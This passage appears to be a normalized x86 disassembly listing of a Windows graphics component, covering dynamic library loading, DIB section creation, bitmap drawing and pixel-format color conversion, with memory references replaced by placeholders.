mov eax [ rw-data ]
push r--data
push eax
call esi
mov ecx [ rw-data ]
push r--data
push ecx
mov [ rw-data ] eax
call esi
mov edx [ rw-data ]
push r--data
push edx
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
mov eax [ rw-data ]
push r--data
push eax
call esi
mov ecx [ rw-data ]
test ecx ecx
mov [ rw-data ] eax
pop esi
je r-xdata
mov al [ esp + 0x14 ]
test al al
je r-xdata
mov al [ esp + 0x14 ]
test al al
je r-xdata
mov edx [ rw-data ]
test edx edx
je r-xdata
mov ecx rw-data
call sub_401420
mov ecx [ esp + 0x4 ]
xor eax eax
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
push 0x0
push r--data
push r--data
jmp r-xdata
push 0x0
push r--data
push r--data
mov edx [ rw-data ]
test edx edx
je r-xdata
push 0x0
call [ MessageBoxA@IAT ]
mov edx [ rw-data ]
test edx edx
je r-xdata
test eax eax
je r-xdata
call ecx
cmp eax 0x1
jne r-xdata
sub_43abf0
push 0xffffffff
push sub_4c021b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x108
mov ecx rw-data
mov [ esp ] rw-data
call sub_404310
mov eax [ rw-data ]
test eax eax
mov [ esp + 0x110 ] 0x0
je r-xdata
push ebx
mov ebx [ lstrcpyA@IAT ]
push ebp
push esi
push edi
push rw-data
lea eax [ esp + 0x18 ]
push eax
call ebx
lea ecx [ esp + 0x14 ]
push ecx
call [ lstrlenA@IAT ]
lea edx [ esp + 0x14 ]
push edx
mov esi eax
call sub_457f00
add esp 0x4
test eax eax
jle r-xdata
mov ecx rw-data
call sub_401420
mov eax 0x1
mov ecx [ esp + 0x108 ]
mov [ fs : 0x0 ] ecx
add esp 0x114
retn
mov edi [ lstrcatA@IAT ]
push r--data
lea eax [ esp + 0x18 ]
push eax
call edi
mov ebp [ LoadLibraryA@IAT ]
lea ecx [ esp + 0x14 ]
push ecx
call ebp
test eax eax
mov [ rw-data ] eax
jne r-xdata
mov [ esp + esi + 0x14 ] 0x5c
mov [ esp + esi + 0x15 ] 0x0
mov esi [ GetProcAddress@IAT ]
push r--data
push eax
call esi
mov ecx [ rw-data ]
push r--data
push ecx
mov [ rw-data ] eax
call esi
mov edx [ rw-data ]
push r--data
push edx
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
mov eax [ rw-data ]
push r--data
push eax
call esi
mov ecx [ rw-data ]
push r--data
push ecx
mov [ rw-data ] eax
call esi
mov edx [ rw-data ]
push r--data
push edx
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
mov eax [ rw-data ]
push r--data
push eax
call esi
mov ecx [ rw-data ]
push r--data
push ecx
mov [ rw-data ] eax
call esi
mov edx [ rw-data ]
push r--data
push edx
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
mov eax [ rw-data ]
push r--data
push eax
call esi
mov ecx [ rw-data ]
push r--data
push ecx
mov [ rw-data ] eax
call esi
mov edx [ rw-data ]
push r--data
push edx
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
mov eax [ rw-data ]
push r--data
push eax
call esi
mov ecx [ rw-data ]
push r--data
push ecx
mov [ rw-data ] eax
call esi
mov edx [ rw-data ]
push r--data
push edx
mov [ rw-data ] eax
call esi
mov ecx [ rw-data ]
test ecx ecx
mov [ rw-data ] eax
je r-xdata
push rw-data
lea edx [ esp + 0x18 ]
push edx
call ebx
lea eax [ esp + 0x14 ]
push eax
call [ lstrlenA@IAT ]
lea ecx [ esp + 0x14 ]
push ecx
mov esi eax
call sub_457f00
add esp 0x4
test eax eax
jle r-xdata
mov eax [ rw-data ]
push eax
call [ FreeLibrary@IAT ]
mov al [ rw-data ]
test al al
mov [ rw-data ] 0x0
jne r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
push r--data
lea edx [ esp + 0x18 ]
push edx
call edi
lea eax [ esp + 0x14 ]
push eax
call ebp
test eax eax
mov [ rw-data ] eax
jne r-xdata
mov [ esp + esi + 0x14 ] 0x5c
mov [ esp + esi + 0x15 ] 0x0
mov ecx rw-data
call sub_401420
xor eax eax
push 0x0
push r--data
push r--data
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
push 0x0
push r--data
push r--data
jmp r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
push 0x0
mov [ rw-data ] 0x1
call [ MessageBoxA@IAT ]
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx rw-data
call sub_401420
mov eax 0x1
jmp r-xdata
mov ecx [ esp + 0x118 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x114
retn
sub_43af50
push 0xffffffff
push sub_4c0238
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x30
push ebx
push ebp
mov ebp ecx
mov eax [ ebp + 0x42c ]
test eax eax
push esi
push edi
mov [ esp + 0x18 ] ebp
je r-xdata
or eax 0xffffffff
mov eax [ esp + 0x5c ]
test eax eax
jl r-xdata
mov esi [ esp + 0x60 ]
test esi esi
jl r-xdata
mov edi [ esp + 0x68 ]
mov ebx [ esp + 0x64 ]
mov edx [ ebp + 0x444 ]
mov ecx [ ebp + 0x448 ]
mov al [ ebp + 0x454 ]
add edi ecx
add ebx edx
test al al
mov [ esp + 0x68 ] edi
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
jge r-xdata
call sub_43abf0
test eax eax
je r-xdata
mov ecx eax
sub ecx esi
sub ecx edi
lea ecx [ eax + esi ]
add ecx edi
neg ecx
jmp r-xdata
mov ecx rw-data
mov [ esp + 0x2c ] ecx
call sub_404310
mov eax [ rw-data ]
test eax eax
mov [ esp + 0x48 ] 0x0
je r-xdata
xor ecx ecx
cmp eax esi
sete cl
dec ecx
and ecx 0xfffffffd
mov eax ecx
jmp r-xdata
mov eax 0xfffffffe
jmp r-xdata
mov edx [ ebp + 0x42c ]
push 0x0
push ebp
push edx
cdq
xor eax edx
sub eax edx
mov edx [ esp + 0x68 ]
push eax
mov eax [ esp + 0x68 ]
push 0x0
push ecx
mov ecx [ esp + 0x6c ]
push ebx
push esi
push edx
mov edx [ esp + 0x74 ]
push eax
push ecx
push edx
call [ SetDIBitsToDevice@IAT ]
test eax eax
jne r-xdata
mov ecx rw-data
call sub_401420
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ esp + 0x40 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x3c
retn 0x1c
push 0xa000a
call [ CreateSolidBrush@IAT ]
mov edx [ esp + 0x60 ]
mov edi [ esp + 0x54 ]
mov ecx [ esp + 0x5c ]
mov esi eax
mov eax [ esp + 0x58 ]
mov [ esp + 0x34 ] eax
add eax edx
mov [ esp + 0x24 ] eax
mov [ esp + 0x3c ] eax
push esi
mov [ esp + 0x34 ] edi
add edi ecx
mov ecx [ esp + 0x54 ]
lea eax [ esp + 0x34 ]
push eax
push ecx
mov [ esp + 0x44 ] edi
call [ FillRect@IAT ]
push esi
call [ DeleteObject@IAT ]
mov edx [ ebp + 0x42c ]
mov ecx [ ebp + 0x434 ]
mov eax [ ebp + 0x430 ]
mov [ esp + 0x64 ] edx
mov edx [ rw-data ]
mov [ esp + 0x20 ] ecx
mov ecx ebp
mov [ esp + 0x1c ] eax
mov [ esp + 0x50 ] edx
call sub_435850
mov esi [ esp + 0x5c ]
mov ecx [ rw-data ]
mov edx [ esp + 0x54 ]
mov ebp eax
mov eax [ esp + 0x60 ]
mov [ esp + 0x5c ] eax
mov eax [ rw-data ]
cmp edi eax
mov [ esp + 0x10 ] ecx
mov [ esp + 0x14 ] esi
jle r-xdata
mov eax [ rw-data ]
cmp [ esp + 0x24 ] eax
jle r-xdata
mov esi eax
sub esi edx
mov [ esp + 0x14 ] esi
mov eax [ esp + 0x18 ]
mov eax [ eax + 0x8 ]
test eax eax
jle r-xdata
sub eax [ esp + 0x58 ]
mov [ esp + 0x5c ] eax
mov eax [ esp + 0x18 ]
mov edi [ eax + 0x440 ]
cmp edi 0x2000000c
jg r-xdata
mov edi [ esp + 0x64 ]
dec eax
imul eax ebp
add edi eax
mov [ esp + 0x64 ] edi
neg ebp
mov eax edi
sub eax 0x20000010
je r-xdata
je r-xdata
cmp edi 0x2000000c
jne r-xdata
sub eax 0x8
je r-xdata
mov eax edi
sub eax 0x10000018
je r-xdata
test dl 0x1
je r-xdata
mov ecx [ esp + 0x68 ]
mov eax ebx
cdq
and edx 0x7
add eax edx
mov esi eax
mov eax ecx
cdq
sub eax edx
mov edx [ esp + 0x5c ]
mov edi eax
mov eax [ esp + 0x14 ]
sar edi 0x1
push 0x0
sar esi 0x3
shl edi 0x1
sub edx edi
push 0x0
shl esi 0x3
sub eax esi
lea ecx [ edx + ecx + 0x1 ]
and ecx 0xfffffffe
push 0x20000010
lea eax [ eax + ebx + 0x7 ]
and eax 0xfffffff8
push ecx
mov [ esp + 0x70 ] ecx
mov ecx [ esp + 0x28 ]
push eax
mov [ esp + 0x3c ] eax
call sub_4397d0
mov eax edi
cdq
sub eax edx
mov ecx eax
sar ecx 0x1
imul ecx ebp
mov eax esi
cdq
sub eax edx
sar eax 0x1
add ecx eax
mov [ esp + 0x24 ] ecx
mov ecx [ esp + 0x18 ]
call sub_435850
mov edx [ esp + 0x60 ]
mov ecx [ esp + 0x18 ]
push eax
mov eax [ esp + 0x2c ]
push ebp
push ebp
push edx
mov edx [ ecx + 0x42c ]
mov ecx [ esp + 0x30 ]
push eax
mov eax [ esp + 0x38 ]
push edx
lea edx [ eax + ecx ]
mov ecx [ esp + 0x34 ]
push edx
mov edx edi
imul edx ebp
add eax ecx
push eax
mov eax [ esp + 0x84 ]
add edx esi
add edx eax
push edx
call [ rw-data ]
mov ecx [ esp + 0x18 ]
mov eax [ ecx + 0x42c ]
mov [ esp + 0x64 ] eax
call sub_435850
mov edx [ esp + 0x54 ]
mov ecx [ esp + 0x10 ]
mov ebp eax
mov eax [ esp + 0x68 ]
sub ebx esi
mov esi [ esp + 0x14 ]
sub eax edi
mov [ esp + 0x68 ] eax
test dl 0x1
je r-xdata
sub eax 0x20000008
jne r-xdata
xor eax eax
cmp edi 0x10000018
setne al
add eax 0x3
test dl 0x1
mov [ esp + 0x24 ] eax
je r-xdata
sub eax 0x8
je r-xdata
imul ecx [ esp + 0x58 ]
mov edi [ esp + 0x64 ]
mov eax ebp
imul eax [ esp + 0x68 ]
add eax edi
mov edi [ esp + 0x50 ]
lea eax [ eax + ebx * 2 ]
add ecx edi
mov [ esp + 0x64 ] eax
lea ecx [ ecx + edx * 2 ]
mov eax esi
and eax 0x1
test bl 0x1
mov [ esp + 0x50 ] ecx
lea ecx [ eax + esi ]
mov [ esp + 0x58 ] eax
mov [ esp + 0x28 ] ecx
je r-xdata
mov edi [ esp + 0x64 ]
mov eax ebp
imul eax [ esp + 0x68 ]
add edi eax
lea eax [ edi + ebx * 2 ]
mov edi [ esp + 0x50 ]
mov [ esp + 0x54 ] eax
mov eax ecx
imul eax [ esp + 0x58 ]
add edi eax
test bl 0x1
lea eax [ edi + edx * 2 - 0x2 ]
mov [ esp + 0x28 ] eax
je r-xdata
mov edi [ esp + 0x64 ]
mov eax ebp
imul eax [ esp + 0x68 ]
lea edi [ edi + ebx * 2 ]
add ebx edi
mov edi [ esp + 0x50 ]
add ebx eax
mov eax ecx
imul eax [ esp + 0x58 ]
push ecx
mov ecx [ esp + 0x60 ]
push ebp
push ecx
add eax edi
push esi
lea edi [ eax + edx * 2 ]
push edi
push ebx
call [ rw-data ]
mov ecx [ esp + 0x54 ]
mov edx esi
and edx 0x1
lea eax [ edx + esi ]
lea edx [ eax + ecx + 0x2 ]
cmp edx [ rw-data ]
jg r-xdata
mov eax ebp
imul eax [ esp + 0x68 ]
lea edi [ ebx + ebx * 2 ]
mov [ esp + 0x54 ] edi
mov edi [ esp + 0x64 ]
add edi eax
mov eax [ esp + 0x54 ]
add eax edi
mov edi [ esp + 0x50 ]
mov [ esp + 0x54 ] eax
mov eax ecx
imul eax [ esp + 0x58 ]
add edi eax
mov eax [ esp + 0x5c ]
test eax eax
lea edi [ edi + edx * 2 - 0x2 ]
jle r-xdata
mov ecx rw-data
call sub_401420
xor eax eax
jmp r-xdata
mov ecx [ esp + 0x10 ]
imul eax ebx
mov ebx [ esp + 0x64 ]
mov edi ebp
imul edi [ esp + 0x68 ]
add edi ebx
mov ebx [ esp + 0x50 ]
add edi eax
mov eax ecx
imul eax [ esp + 0x58 ]
add eax ebx
test esi esi
lea ebx [ eax + edx * 2 ]
jle r-xdata
mov edi [ esp + 0x64 ]
imul eax ebx
add edi eax
mov esi ebp
imul esi [ esp + 0x68 ]
mov eax ecx
imul eax [ esp + 0x58 ]
add esi edi
mov edi [ esp + 0x50 ]
add edi eax
lea eax [ edi + edx * 2 - 0x2 ]
mov edi [ esp + 0x5c ]
test edi edi
jle r-xdata
sub eax 0xfffffe8
jne r-xdata
mov esi [ esp + 0x5c ]
test esi esi
lea eax [ ecx + ecx ]
jle r-xdata
mov eax [ esp + 0x5c ]
test eax eax
jle r-xdata
mov [ esp + 0x24 ] 0x1
mov eax 0x3
mov [ esp + 0x24 ] 0xffffffff
mov eax 0x1
jmp r-xdata
mov edx [ esp + 0x5c ]
test edx edx
lea ecx [ edi + eax * 2 ]
lea eax [ esi + ebx ]
lea eax [ eax + esi * 2 - 0x3 ]
jle r-xdata
inc edx
inc ebx
mov [ esp + 0x54 ] edx
dec esi
add edi 0x2
mov [ esp + 0x60 ] eax
jmp r-xdata
mov eax esi
and eax 0x1
add eax esi
lea ecx [ eax + edx + 0x2 ]
cmp ecx [ rw-data ]
jg r-xdata
mov edx [ esp + 0x18 ]
cmp [ edx + 0x440 ] 0x10000018
push 0x0
push ecx
push ebp
jne r-xdata
mov eax [ esp + 0x14 ]
inc edx
inc ebx
dec eax
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x24 ]
mov esi [ esp + 0x14 ]
mov [ esp + 0x54 ] edx
add eax 0x2
mov [ esp + 0x1c ] eax
mov [ esp + 0x20 ] edi
jmp r-xdata
test dl 0x1
je r-xdata
mov ebx [ esp + 0x64 ]
mov edi [ esp + 0x50 ]
lea ecx [ ecx + edx + 0x2 ]
mov edx esi
mov [ esp + 0x68 ] ecx
mov [ esp + 0x54 ] edx
mov edi [ esp + 0x64 ]
lea edx [ ecx + edx + 0x2 ]
mov [ esp + 0x68 ] edx
mov [ esp + 0x5c ] eax
jmp r-xdata
inc edx
inc ebx
dec esi
mov [ esp + 0x14 ] esi
mov edi [ esp + 0x54 ]
add eax edi
mov edi [ esp + 0x20 ]
mov [ esp + 0x60 ] eax
mov eax [ esp + 0x28 ]
add eax 0x2
mov [ esp + 0x1c ] eax
mov eax [ esp + 0x24 ]
sub eax edi
mov [ esp + 0x28 ] eax
mov eax [ esp + 0x5c ]
mov [ esp + 0x24 ] eax
mov edi [ esp + 0x5c ]
test edi edi
mov [ esp + 0x20 ] eax
jle r-xdata
mov edi [ esp + 0x10 ]
mov esi edx
mov edi edi
mov eax [ esp + 0x54 ]
mov al [ eax + 0x1 ]
mov [ edi - 0x1 ] al
mov eax [ esp + 0x54 ]
mov al [ eax ]
mov [ edi ] al
mov eax [ esp + 0x54 ]
mov al [ eax + 0x2 ]
mov [ edi + 0x1 ] al
add [ esp + 0x54 ] ebp
mov eax [ esp + 0x60 ]
add edi ecx
dec eax
mov [ esp + 0x60 ] eax
jne r-xdata
dec esi
imul esi [ esp + 0x24 ]
lea ebx [ ebx + eax * 2 ]
mov eax [ esp + 0x5c ]
add edi esi
test eax eax
jle r-xdata
mov ecx [ esp + 0x68 ]
push ecx
push esi
push ebx
push edi
call [ rw-data ]
mov eax [ esp + 0x68 ]
push eax
push esi
push ebx
push edi
call [ rw-data ]
jmp r-xdata
movzx eax [ esi ]
movzx edx [ esi + 0x1 ]
movzx edi [ esi + 0x2 ]
imul edx edx 0x9646
mov [ esp + 0x60 ] eax
imul eax eax 0x1d2f
add edx eax
mov eax edi
imul eax eax 0x4c8b
lea edx [ edx + eax + 0x8000 ]
mov eax [ esp + 0x60 ]
sar edx 0x10
shl eax 0x10
mov [ esp + 0x28 ] edx
shl edx 0x10
sub eax edx
sar eax 0xa
imul eax eax 0x242
add eax 0x808000
shl edi 0x10
sar eax 0x10
sub edi edx
test eax eax
jge r-xdata
mov eax [ esp + 0x10 ]
mov edi [ esp + 0x50 ]
push 0x0
mov ecx eax
imul ecx [ esp + 0x5c ]
push eax
push ebp
imul ebp [ esp + 0x74 ]
add ecx edi
lea edi [ ecx + edx * 2 ]
mov edx [ esp + 0x68 ]
mov ecx [ esp + 0x70 ]
push edx
push esi
add ebp ecx
push edi
add ebp ebx
push ebp
call [ rw-data ]
mov ecx [ esp + 0x54 ]
mov eax esi
and eax 0x1
add esi eax
mov eax [ rw-data ]
lea edx [ esi + ecx + 0x2 ]
cmp edx eax
jg r-xdata
mov ecx [ esp + 0x10 ]
imul ecx [ esp + 0x58 ]
mov edi [ esp + 0x64 ]
mov eax ebp
imul eax [ esp + 0x68 ]
add eax edi
mov edi [ esp + 0x50 ]
add edi ecx
lea ecx [ edi + edx * 2 - 0x2 ]
mov edi [ esp + 0x5c ]
add eax ebx
test edi edi
jle r-xdata
mov edx [ esp + 0x10 ]
mov ecx [ esp + 0x54 ]
add edi edx
add ebx ebp
dec ecx
mov [ esp + 0x50 ] edi
mov [ esp + 0x54 ] ecx
jne r-xdata
mov esi [ esp + 0x5c ]
cmp esi 0x1
mov eax [ esp + 0x50 ]
jne r-xdata
mov edi [ esp + 0x60 ]
mov eax [ esp + 0x28 ]
mov al [ eax + edi ]
mov edi [ esp + 0x1c ]
mov [ edi - 0x1 ] al
mov eax [ esp + 0x54 ]
mov al [ eax ]
mov [ edi ] al
mov eax [ esp + 0x60 ]
mov al [ eax ]
mov [ edi + 0x1 ] al
add [ esp + 0x54 ] ebp
add [ esp + 0x60 ] ebp
mov eax [ esp + 0x24 ]
add edi ecx
dec eax
mov [ esp + 0x1c ] edi
mov [ esp + 0x24 ] eax
jne r-xdata
mov dl [ eax + 0x1 ]
mov [ ecx + 0x1 ] dl
mov dl [ eax + 0x2 ]
mov [ ecx + 0x3 ] dl
add eax ebp
add ecx edi
dec esi
jne r-xdata
mov ecx rw-data
call sub_401420
xor eax eax
jmp r-xdata
mov edx eax
mov [ esp + 0x68 ] edx
mov edi edi
mov edx [ esp + 0x54 ]
cmp eax 0xff
jle r-xdata
xor eax eax
jmp r-xdata
mov ecx [ esp + 0x5c ]
test ecx ecx
lea eax [ edi + esi * 2 ]
jle r-xdata
inc edx
inc ebx
mov [ esp + 0x54 ] edx
dec esi
lea edi [ ecx + 0x2 ]
mov ecx [ esp + 0x5c ]
mov [ esp + 0x54 ] ecx
mov ecx eax
mov edx ecx
shr ecx 0x2
mov esi ebx
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ esp + 0x68 ]
cmp ecx [ rw-data ]
mov edi [ esp + 0x50 ]
jg r-xdata
dec esi
mov dl [ eax + ebx - 0x3 ]
mov [ eax + edi + 0x1 ] dl
mov cl [ eax + ebx - 0x1 ]
mov [ eax + edi + 0x3 ] cl
jne r-xdata
mov eax esi
cdq
sub eax edx
sar eax 0x1
shl eax 0x1
test eax eax
mov [ esp + 0x54 ] 0x0
jle r-xdata
mov cl [ edi ]
mov [ eax ] cl
mov dl [ edi + 0x2 ]
mov [ eax + 0x2 ] dl
mov cl [ edi - 0x1 ]
mov [ eax + 0x1 ] cl
mov dl [ edi + 0x1 ]
mov [ eax + 0x3 ] dl
cmp eax 0xff
jle r-xdata
xor eax eax
jmp r-xdata
sar edi 0xa
imul edi edi 0x2da
add edi 0x808000
sar edi 0x10
test edi edi
mov [ esp + 0x60 ] edi
jge r-xdata
mov eax 0xff
mov edx [ esp + 0x10 ]
lea esp [ esp ]
mov [ edi - 0x1 ] 0x80
mov cl [ eax ]
mov [ edi ] cl
mov ecx [ esp + 0x10 ]
mov [ edi + 0x1 ] 0x80
add edi ecx
mov ecx [ esp + 0x54 ]
add eax ebp
dec ecx
mov [ esp + 0x54 ] ecx
jne r-xdata
mov eax [ esp + 0x58 ]
test eax eax
je r-xdata
mov edx [ esp + 0x50 ]
mov ebx edi
sub ebx edx
mov [ esp + 0x60 ] ebx
lea ebx [ eax - 0x1 ]
shr ebx 0x1
inc ebx
lea eax [ ebx + ebx ]
lea ecx [ edi + 0x3 ]
lea esi [ edx + 0x2 ]
mov [ esp + 0x54 ] eax
jmp r-xdata
add eax [ esp + 0x10 ]
mov [ esp + 0x50 ] eax
mov eax [ esp + 0x5c ]
add edi ebp
dec eax
mov [ esp + 0x5c ] eax
jne r-xdata
cmp [ esp + 0x14 ] 0x1
jne r-xdata
sar ecx 0xa
imul ecx ecx 0x2da
add ecx 0x808000
sar ecx 0x10
test ecx ecx
jge r-xdata
mov eax 0xff
cmp [ esp + 0x60 ] 0xff
jle r-xdata
xor edx edx
jmp r-xdata
mov [ eax + 0x1 ] 0x80
mov [ eax + 0x3 ] 0x80
add eax edx
dec ecx
jne r-xdata
mov ecx rw-data
call sub_401420
xor eax eax
jmp r-xdata
mov eax [ esp + 0x50 ]
mov ecx [ esp + 0x54 ]
mov dl [ edi + ecx * 2 ]
mov eax [ esp + 0x50 ]
mov [ eax + ecx * 2 ] dl
mov dl [ edi + ecx * 2 - 0x1 ]
mov [ eax + ecx * 2 + 0x1 ] dl
mov dl [ edi + ecx * 2 + 0x1 ]
mov [ eax + ecx * 2 + 0x3 ] dl
jmp r-xdata
mov dl [ ecx - 0x3 ]
mov eax [ esp + 0x60 ]
mov [ esi - 0x2 ] dl
mov dl [ eax + esi ]
mov [ esi ] dl
movzx edx [ ecx ]
movzx eax [ ecx - 0x4 ]
add eax edx
cdq
sub eax edx
sar eax 0x1
mov [ esi - 0x1 ] al
movzx edx [ ecx + 0x2 ]
movzx eax [ ecx - 0x2 ]
add eax edx
cdq
sub eax edx
sar eax 0x1
mov [ esi + 0x1 ] al
add ecx 0x4
add esi 0x4
dec ebx
jne r-xdata
mov esi [ esp + 0x14 ]
mov ecx rw-data
call sub_401420
xor eax eax
jmp r-xdata
mov ecx [ esp + 0x58 ]
test ecx ecx
jne r-xdata
mov dl [ edi - 0x1 ]
mov [ eax + 0x5 ] dl
mov cl [ edi + 0x1 ]
mov [ eax + 0x7 ] cl
jmp r-xdata
cmp ecx 0xff
jle r-xdata
xor ecx ecx
jmp r-xdata
mov dl [ esp + 0x60 ]
mov edx 0xff
jmp r-xdata
mov edi [ esp + 0x1c ]
mov [ edi - 0x1 ] al
mov al [ esp + 0x28 ]
mov [ edi ] al
mov eax [ esp + 0x20 ]
mov [ edi + 0x1 ] dl
add edi ecx
add esi ebp
dec eax
mov [ esp + 0x1c ] edi
mov [ esp + 0x20 ] eax
jne r-xdata
mov ecx [ rw-data ]
cmp [ esp + 0x68 ] ecx
jg r-xdata
mov ecx [ esp + 0x28 ]
mov dl [ edi + ecx * 2 - 0x5 ]
mov [ eax + ecx * 2 + 0x1 ] dl
mov dl [ edi + ecx * 2 - 0x3 ]
mov [ eax + ecx * 2 + 0x3 ] dl
mov [ ebx + 0x1 ] al
mov eax [ esp + 0x68 ]
mov [ ebx + 0x3 ] cl
mov ecx [ esp + 0x10 ]
add edi ebp
add ebx ecx
dec eax
mov [ esp + 0x68 ] eax
jne r-xdata
mov ecx 0xff
mov edx [ esp + 0x54 ]
movzx ecx [ edi + 0x2 ]
movzx edx [ edi + 0x1 ]
movzx eax [ edi ]
imul edx edx 0x9646
mov esi ecx
imul esi esi 0x4c8b
add edx esi
mov esi eax
imul esi esi 0x1d2f
shl eax 0x10
lea edx [ edx + esi + 0x8000 ]
and edx 0xffff0000
sub eax edx
sar eax 0xa
imul eax eax 0x242
add eax 0x808000
shl ecx 0x10
sar eax 0x10
sub ecx edx
test eax eax
jge r-xdata
mov ecx rw-data
call sub_401420
xor eax eax
jmp r-xdata
sub_43ba10
sub esp 0x924
push ebx
push ebp
push esi
push edi
mov ebp ecx
call sub_439440
mov esi [ esp + 0x93c ]
mov eax [ esp + 0x950 ]
mov ebx [ esp + 0x940 ]
mov edx [ esp + 0x948 ]
mov ecx 0x10a
mov edi ebp
[ edi ] [ esi ]
mov ecx [ esp + 0x944 ]
mov esi [ esp + 0x94c ]
mov edi [ esp + 0x958 ]
mov [ ebp + 0x430 ] ecx
mov ecx [ esp + 0x938 ]
mov [ ebp + 0x440 ] ecx
mov cl [ esp + 0x95c ]
test cl cl
mov [ ebp + 0x448 ] eax
mov eax [ esp + 0x954 ]
mov [ ebp + 0x444 ] esi
mov [ ebp + 0x42c ] ebx
mov [ ebp + 0x434 ] edx
mov [ ebp + 0x438 ] eax
mov [ ebp + 0x43c ] edi
je r-xdata
mov eax [ ebp + 0x440 ]
cmp eax 0x10000001
jne r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp eax 0x20000008
jne r-xdata
test cl cl
jne r-xdata
cmp eax 0x3
jne r-xdata
cmp eax 0x2000000c
je r-xdata
test cl cl
je r-xdata
mov ebx [ ebp + 0x20 ]
test ebx ebx
mov [ esp + 0x18 ] ebx
jne r-xdata
mov al [ esp + 0x960 ]
test al al
jne r-xdata
mov eax [ esp + 0x954 ]
lea ecx [ eax + eax * 2 + 0xf ]
and ecx 0xfffffff0
mov eax 0x55555556
imul ecx
mov eax edx
shr eax 0x1f
add edx eax
xor eax eax
push eax
push eax
lea ecx [ esp + 0x34 ]
push ecx
push eax
push ebp
push eax
mov [ ebp + 0x440 ] 0x10000018
mov [ ebp + 0xe ] 0x18
mov [ ebp ] 0x28
mov [ ebp + 0x4 ] edx
mov [ ebp + 0x8 ] edi
mov [ ebp + 0xc ] 0x1
mov [ ebp + 0x10 ] eax
mov [ ebp + 0x14 ] eax
mov [ ebp + 0x18 ] eax
mov [ ebp + 0x20 ] eax
mov [ ebp + 0x24 ] eax
call [ CreateDIBSection@IAT ]
test eax eax
mov [ esp + 0x1c ] eax
je r-xdata
mov ax [ ebp + 0xe ]
cmp ax 0x10
jne r-xdata
call sub_43abf0
test eax eax
je r-xdata
cmp eax 0x20000010
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x924
retn 0x2c
mov ecx ebp
call sub_439ce0
pop edi
pop esi
pop ebp
pop ebx
add esp 0x924
retn 0x2c
mov di [ ebp + 0xe ]
cmp di 0x8
jne r-xdata
mov cl [ ebp + 0xe ]
mov ebx 0x1
shl ebx cl
mov [ esp + 0x18 ] ebx
mov ax [ ebp + 0xe ]
cmp ax 0x1
je r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x924
retn 0x2c
push 0x0
call [ CreateCompatibleDC@IAT ]
test eax eax
mov [ esp + 0x18 ] eax
jne r-xdata
cmp ax 0x20
jne r-xdata
cmp [ ebp + 0x28 ] 0x7c00
jne r-xdata
mov eax [ ebp + 0x440 ]
cmp eax 0x2000000c
jne r-xdata
cmp eax 0x20000018
je r-xdata
mov edx [ ebp + 0x438 ]
mov ecx [ ebp + 0x8 ]
mov eax esi
and eax 0x7
add edx eax
and esi 0xfffffff8
test ecx ecx
mov [ ebp + 0x438 ] edx
mov [ ebp + 0x444 ] eax
mov [ ebp + 0x448 ] 0x0
jge r-xdata
xor eax eax
test ebx ebx
jle r-xdata
cmp ax 0x4
je r-xdata
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0x18 ]
push eax
push ecx
call [ SelectObject@IAT ]
mov edx [ esp + 0x954 ]
xor ecx ecx
mov [ ebp + 0x438 ] edx
mov edx [ esp + 0x93c ]
mov [ ebp + 0x444 ] ecx
mov [ ebp + 0x448 ] ecx
mov [ ebp + 0x43c ] edi
mov eax [ edx + 0x8 ]
cmp eax ecx
jge r-xdata
mov edx [ esp + 0x1c ]
push edx
call [ DeleteObject@IAT ]
cmp [ ebp + 0x28 ] 0xff0000
jne r-xdata
cmp [ ebp + 0x2c ] 0x3e0
jne r-xdata
cmp eax 0x20000010
jne r-xdata
mov ecx [ ebp + 0x438 ]
mov eax esi
and eax 0x7
lea edx [ eax + ecx + 0x1 ]
mov ecx [ esp + 0x950 ]
and edx 0xfffffffe
mov [ ebp + 0x444 ] eax
mov eax ecx
mov [ ebp + 0x438 ] edx
mov edx [ ebp + 0x43c ]
and eax 0x1
and ecx 0xfffffffe
lea edx [ eax + edx + 0x1 ]
and edx 0xfffffffe
mov [ esp + 0x950 ] ecx
mov ecx ebp
and esi 0xfffffff8
mov [ ebp + 0x43c ] edx
mov [ ebp + 0x448 ] eax
call sub_435850
mov edi eax
imul edi [ esp + 0x950 ]
add edi ebx
mov [ esp + 0x10 ] eax
mov al [ esp + 0x960 ]
add edi esi
test al al
je r-xdata
cmp eax 0x10000010
jne r-xdata
mov eax [ ebp + 0x42c ]
mov [ esp + 0x10 ] eax
mov eax [ ebp + 0x45c ]
test eax eax
movzx edi di
jne r-xdata
mov eax [ ebp + 0x45c ]
test eax eax
mov ecx [ ebp + 0x42c ]
jne r-xdata
cmp eax ebx
jne r-xdata
